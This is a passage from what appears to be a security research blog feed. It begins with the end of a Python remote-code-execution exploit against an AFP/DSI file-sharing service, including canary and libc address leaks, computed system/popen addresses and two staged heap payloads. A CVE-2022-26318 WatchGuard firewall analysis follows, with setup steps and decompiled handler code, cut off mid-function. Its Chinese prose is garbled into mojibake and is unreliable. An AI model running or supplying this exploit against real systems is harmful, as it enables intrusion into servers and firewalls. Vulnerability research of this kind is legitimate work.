Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte2&quot;</span> % <span class="built_in">len</span>(byte2))</span><br><span class="line">    <span class="keyword">for</span> m_byte2 <span class="keyword">in</span> byte2:</span><br><span class="line">        global_locale = global_locale | (m_byte2 &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        byte3 = _leak2(<span class="number">3</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte2)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte3)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte3&quot;</span> % <span class="built_in">len</span>(byte3))</span><br><span class="line">    <span class="keyword">for</span> m_byte3 <span class="keyword">in</span> byte3:</span><br><span class="line">        global_locale = global_locale | (m_byte3 &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        byte4 = _leak2(<span class="number">4</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte3)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">24</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte4)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte4&quot;</span> % <span class="built_in">len</span>(byte4))</span><br><span class="line">    <span class="keyword">for</span> m_byte4 <span class="keyword">in</span> byte4:</span><br><span class="line">        global_locale = global_locale | (m_byte4 &lt;&lt; <span class="number">32</span>)</span><br><span class="line">        byte5 = _leak2(<span class="number">5</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte4)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte5)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    global_locale |= (byte5[<span class="number">0</span>] &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    libc_addr = global_locale - nl_global_locale_offset</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got libc: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ISHFTC</span>(<span class="params">n, d, N</span>):  </span><br><span class="line">    <span class="keyword">return</span> ((n &lt;&lt; d) % (<span class="number">1</span> &lt;&lt; N)) | (n &gt;&gt; (N - d))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Connecting to %s:%d ...&quot;</span> % (R_HOST, R_PORT))</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Fetching server info ...&quot;</span>)</span><br><span class="line">    _get_srv_info_packet = DSI(<span class="number">0x0</span>, DSI_FPGetSrvrInfo, <span class="number">0x0101</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_get_srv_info_packet)</span><br><span class="line">    simple_parse_srvInfo(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    canary = leak_canary()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    libc_addr = leak_libc()</span><br><span class="line">    </span><br><span class="line">    s = connect_open_session()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 1)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_system_address = ISHFTC(libc_addr + <span class="number">0x0000000000453A0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_execl_addr = ISHFTC(<span class="number">0x000000000408DA0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_popen_addr = ISHFTC(libc_addr + <span class="number">0x00000000006F610</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    setcontext_addr = ISHFTC(libc_addr + <span class="number">0x000000000047B97</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    fake_dtor_list = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    gold = fake_dtor_list + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x656240</span>) + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x80</span> - <span class="number">0x20</span> - <span class="number">8</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x00000000006F5B6</span>) + command</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;\x12&quot;</span> + <span class="string">b&quot;\x06\x41\x46\x50\x33\x2e\x33&quot;</span> + <span class="string">b&quot;\x04\x44\x48\x58\x32&quot;</span> + struct.pack(<span class="string">&quot;&lt;B&quot;</span>, <span class="built_in">len</span>(gold) + <span class="number">0x10</span>) + username + gold + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _fplogin_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_fplogin_packet)</span><br><span class="line">    s.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 2)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * nl_global_locale_padding_offset + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + nl_global_locale_offset) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c8a80</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xb</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1767a0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x176da0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1776a0</span>) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c4b20</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">48</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0xc79010</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">16</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, canary) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _test_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_test_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_close_packet)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit finish.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-26318</title>
    <url>/2022/03/30/CVE-2022-26318/</url>
    <content><![CDATA[<p>2022 å¹´ 2 æœˆ 28 æ—¥ï¼ŒCVE å®˜æ–¹å‘å¸ƒäº†å½±å“ Watchguard é˜²ç«å¢™ç­‰è®¾å¤‡çš„ RCE æ¼æ´ CVE-2022-26318ï¼Œ3 æœˆ 27 æ—¥ï¼Œè¯¥æ¼æ´çš„ EXP å¼€å§‹åœ¨ç½‘ä¸Šæµä¼ ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´çš„æˆå› è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h2 id="å»ºç«‹è°ƒè¯•ç¯å¢ƒ"><a href="#å»ºç«‹è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="å»ºç«‹è°ƒè¯•ç¯å¢ƒ"></a>å»ºç«‹è°ƒè¯•ç¯å¢ƒ</h2><h3 id="è·å–-shell"><a href="#è·å–-shell" class="headerlink" title="è·å– shell"></a>è·å– shell</h3><p>FireBox æä¾›çš„ busybox ç»è¿‡å¤§é‡é˜‰å‰²ï¼Œå¹¶ä¸”æ²¡æœ‰ shï¼Œé¦–å…ˆé€šè¿‡æŒ‚è½½ç£ç›˜çš„æ–¹å¼ä¿®æ­£è®¾å¤‡ç¯å¢ƒã€‚</p>
<p>å¯¼å…¥è™šæ‹Ÿæœºä¹‹åå°†å…¶è™šæ‹Ÿç¡¬ç›˜æŒ‚è½½åˆ°å¦å¤–ä¸€ä¸ªç³»ç»Ÿä¸‹ï¼Œå°†å®Œæ•´ç‰ˆçš„ busybox å’Œ sh æ”¾åœ¨ &#x2F;bin ç›®å½•ä¸‹ï¼Œå¹¶ä¸”èµ‹äºˆå®ƒä»¬ suid æƒé™ï¼Œç„¶åä¿®æ”¹ &#x2F;etc&#x2F;passwd æ–‡ä»¶ä¸­çš„ root ç”¨æˆ·å¯†ç ã€‚</p>
<p>ä¹‹åå°† exp ä¸­æ‰§è¡Œ &#x2F;bin&#x2F;python -i æ›¿æ¢ä¸º &#x2F;bin&#x2F;sh -iï¼Œæ‰§è¡Œåå³å¯è·å– shellï¼Œä¸è¿‡æ­¤æ—¶æ˜¯ nobody æƒé™ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ææƒåˆ° root</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">busybox su</span><br><span class="line">&lt;è¾“å…¥å¯†ç &gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-1.png"
                     
                ></p>
<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>é€šè¿‡ wget å°† gdbserver ä¸‹è½½åˆ° &#x2F;tmp ç›®å½•ä¸‹ï¼Œå°è¯•æ‰§è¡Œä¼šæç¤ºæ— æƒé™ï¼Œæ£€æŸ¥ mount ä¿¡æ¯å‘ç° &#x2F;tmp ç›®å½•è¢«æŒ‚è½½ä¸º noexecï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é‡æ–°æŒ‚è½½</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">mount -o rw,remount /dev/wgrd.var /tmp</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ”¾å…¥çš„ gdbserver å³å¯æ­£å¸¸è¿è¡Œã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹åªæœ‰ web ç­‰å‘å¤–æä¾›æœåŠ¡çš„ç«¯å£å¯ä»¥è®¿é—®ï¼Œä¸ºäº†è¿œç¨‹è°ƒè¯•ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹é˜²ç«å¢™è§„åˆ™ã€‚</p>
<p>è¿›å…¥ç³»ç»Ÿåå°ï¼Œåœ¨ Firewall é€‰é¡¹ä¸‹æ·»åŠ æ–°çš„é˜²ç«å¢™è§„åˆ™</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-2.png"
                     
                ></p>
<p>è¿™æ ·é˜²ç«å¢™å…¶ä»–ç«¯å£å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ ¹æ®ç›¸å…³å…¬å‘Šï¼Œå­˜åœ¨æ¼æ´çš„æ–‡ä»¶æ˜¯ wgagentï¼Œæ¥å£ä¸º &#x2F;agent&#x2F;login</p>
<p>é€†å‘åˆ†ææ­¤æ–‡ä»¶ï¼Œæœç´¢ &#x2F;agent&#x2F;login å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°å¤„ç† login è¯·æ±‚çš„ handler å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( s1 &amp;&amp; (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;/login&quot;</span>) || !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;/agent/login&quot;</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">    login_handler(&amp;ptr);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_396;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>login_handler å‡½æ•°å¼€å¤´å°±ä¼šè°ƒç”¨å‡½æ•° wga_parse_input å¤„ç† POST æ•°æ®ï¼Œéƒ¨åˆ†å…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">wga_parse_input</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *content_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    PushParserCtxt = <span class="number">0LL</span>;</span><br><span class="line">    v22 = <span class="number">99999</span>;</span><br><span class="line">    v31 = <span class="number">0</span>;</span><br><span class="line">    is_gzip = <span class="number">0</span>;</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    v28 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( content_type &amp;&amp; !strcasecmp(content_type, <span class="string">&quot;gzip&quot;</span>) )</span><br><span class="line">        ++is_gzip;</span><br><span class="line">    bzero(s, <span class="number">0x100</span>uLL);</span><br><span class="line">    xmlSAX2InitDefaultSAXHandler(s, <span class="number">1LL</span>);</span><br><span class="line">    xmlSAX2InitDefaultSAXHandler(s, <span class="number">1LL</span>);</span><br><span class="line">    s[<span class="number">12</span>] = startDocument;</span><br><span class="line">    s[<span class="number">13</span>] = endDocument;</span><br><span class="line">    s[<span class="number">29</span>] = startElementNs;</span><br><span class="line">    s[<span class="number">30</span>] = endElementNs;</span><br><span class="line">    s[<span class="number">17</span>] = characters;</span><br><span class="line">    s[<span class="number">6</span>] = <span class="number">0LL</span>;                                   <span class="comment">// entityDecl</span></span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">216uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        PushParserCtxt = xmlCreatePushParserCtxt(s, ptr, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( PushParserCtxt )</span><br><span class="line">        &#123;</span><br><span class="line">            ::s[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            bzero(haystack, <span class="number">0x186A0</span>uLL);</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                Str = FCGX_GetStr(haystack, v22, a1);</span><br><span class="line">                <span class="keyword">if</span> ( !Str )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                v27 = <span class="number">0LL</span>;</span><br><span class="line">                v27 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;!ENTITY&quot;</span>);</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">if</span> ( is_gzip )                          <span class="comment">// å¦‚æœå‹ç¼©äº†ï¼Œè¦å…ˆè§£å‹</span></span><br><span class="line">                &#123;</span><br><span class="line">                    v24 = <span class="number">0</span>;</span><br><span class="line">                    v4 = &amp;haystack[v28];</span><br><span class="line">                    v5 = Str;</span><br><span class="line">                    v6 = <span class="number">0LL</span>;</span><br><span class="line">                    v7 = v3;</span><br><span class="line">                    v8 = <span class="number">99999</span>;</span><br><span class="line">                    v25 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> ( !v25 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v25 = inflate(&amp;v4, <span class="number">2LL</span>);            <span class="comment">// è§£å‹æ•°æ®</span></span><br><span class="line">                        <span class="keyword">if</span> ( v25 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> ( v25 == <span class="number">1</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                                v3[v9] = <span class="number">0</span>;</span><br><span class="line">                                v32 = xmlParseChunk(PushParserCtxt, v3, v9, <span class="number">0LL</span>);</span><br><span class="line">                                v24 += v9;</span><br><span class="line">                                v9 = <span class="number">0LL</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                v32 = <span class="number">-1</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v32 = xmlParseChunk(PushParserCtxt, v3, v9, <span class="number">0LL</span>);</span><br><span class="line">                            <span class="keyword">if</span> ( v32 )</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">                            v24 += v9;</span><br><span class="line">                            v9 = <span class="number">0LL</span>;</span><br><span class="line">                            v8 = <span class="number">99999</span>;</span><br><span class="line">                            v7 = v3;</span><br><span class="line">                            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_48;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æˆ·æäº¤çš„æ•°æ®åº”è¯¥æ˜¯ XML æ ¼å¼ï¼Œç¨‹åºä½¿ç”¨ libxml2 å¯¹æ•°æ®è¿›è¡Œè§£æï¼Œåœ¨å‡½æ•°å¼€å¤´ä½¿ç”¨äº† xmlSAX2InitDefaultSAXHandlerï¼Œåˆå§‹åŒ– SAX handlerï¼ŒSAX æ˜¯ä¸€ç§ XML è§£ææ–¹å¼ï¼Œåœ¨ libxml2 ä¸­ä½¿ç”¨ SAX è§£æ XML æ—¶éœ€è¦åˆå§‹åŒ–ä¸€äº› handlerï¼Œæˆ‘æ ¹æ® libxml2 æºç å¯¹éƒ¨åˆ† handler è¿›è¡Œäº†é‡å‘½å</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">s[<span class="number">12</span>] = startDocument;</span><br><span class="line">s[<span class="number">13</span>] = endDocument;</span><br><span class="line">s[<span class="number">29</span>] = startElementNs;</span><br><span class="line">s[<span class="number">30</span>] = endElementNs;</span><br><span class="line">s[<span class="number">17</span>] = characters;</span><br><span class="line">s[<span class="number">6</span>] = <span class="number">0LL</span>;                                   <span class="comment">// entityDecl</span></span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯ startElementNsï¼Œæ ¹æ®æºç æ³¨é‡Šï¼Œè¿™ä¸ªå›è°ƒå‡½æ•°ä¼šåœ¨æ¯æ¬¡ä¸€ä¸ªæ–°çš„ element å¼€å§‹æ—¶è¢«è°ƒç”¨</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAX2 callback when an element start has been detected by the parser.</span><br><span class="line">It provides the namespace informations for the element, as well as</span><br><span class="line">the new namespace declarations on the element.</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´æ¯å½“é‡åˆ°ä¸€ä¸ªæ–°çš„ xml æ ‡ç­¾å¼€å§‹æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œæ­¤å‡½æ•°ï¼Œè€Œè¿™äº› handler ç”± Watchguard å¼€å‘è€…è‡ªè¡Œå®ç°ã€‚</p>
<p>æˆ‘ä»¬æ¥çœ‹ startElementNs å’Œ endElementNs å‡½æ•°ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *__fastcall <span class="title function_">startElementNs</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *tag_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v6; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">    __int64 v7; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">    <span class="type">void</span> *v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">    _QWORD *v9; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">    _QWORD *v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    result = *(a1 + <span class="number">76</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(a1 + <span class="number">0x50</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> ( *(a1 + <span class="number">80</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( strcasecmp(tag_name, <span class="string">&quot;methodName&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        result = a1;</span><br><span class="line">                        ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *(a1 + <span class="number">80</span>) = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;member&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( !*(a1 + <span class="number">108</span>) || !*(a1 + <span class="number">120</span>) || !*(a1 + <span class="number">128</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            result = a1;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        v10 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            fwrite(<span class="string">&quot;No memory!!!!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                            result = a1;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">4</span>;</span><br><span class="line">                        *v10 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                        *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = v10;</span><br><span class="line">                        ++*(*(a1 + <span class="number">128</span>) + <span class="number">16LL</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;param&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v9 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( !v9 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            result = __errno_location();</span><br><span class="line">                            *result = <span class="number">12</span>;</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( *(a1 + <span class="number">128</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            **(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                            v9[<span class="number">1</span>] = *(a1 + <span class="number">128</span>);</span><br><span class="line">                            *(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                        &#125;</span><br><span class="line">                        *(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                        <span class="keyword">if</span> ( !*(a1 + <span class="number">120</span>) )</span><br><span class="line">                            *(a1 + 